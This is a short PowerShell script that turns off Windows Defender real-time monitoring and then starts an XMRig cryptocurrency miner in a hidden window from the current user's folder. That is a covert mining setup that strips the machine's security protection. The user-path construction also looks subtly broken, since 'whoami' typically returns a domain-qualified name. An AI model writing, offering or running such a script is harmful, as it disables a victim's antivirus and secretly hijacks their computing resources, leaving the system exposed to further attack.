$User = whoami

Set-MpPreference -DisableRealtimeMonitoring $true
Start-Process "C:\Users\$User\xmrig-6.18.0\xmrig.exe" -WindowStyle Hidden

